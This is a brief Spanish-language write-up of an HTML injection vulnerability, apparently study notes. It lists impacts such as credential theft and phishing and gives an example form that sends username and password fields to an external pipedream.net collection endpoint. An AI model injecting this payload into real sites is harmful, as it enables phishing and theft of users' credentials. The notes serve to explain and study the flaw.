- --
### 🌐 Resumen de la Vulnerabilidad: HTML Injection

#### 📝 Descripción
Esta vulnerabilidad permite inyectar código HTML malicioso en una página web, aprovechando la falta de filtrado o sanitización en campos de entrada o parámetros.

#### 🚩 Impacto
- **Robo de credenciales**: Al modificar el código HTML para enviar los datos a un servidor controlado por el atacante (como el mostrado en la imagen).
- **Phishing**: Crear formularios falsos que recopilen información de los usuarios.
- **Modificación de la interfaz**: Manipulación de elementos visibles para engañar al usuario.

#### 💡 Ejemplo de Explotación
El código HTML mostrado en la imagen se puede insertar en una página vulnerable para capturar credenciales:
```html
<form action="https://eo2iwcccmp2l4wb.m.pipedream.net" method="GET">
    <input type="text" name="username" hidden>
    <input type="password" name="password" hidden>
    <button type="submit">Click me</button>
</form>
```

---
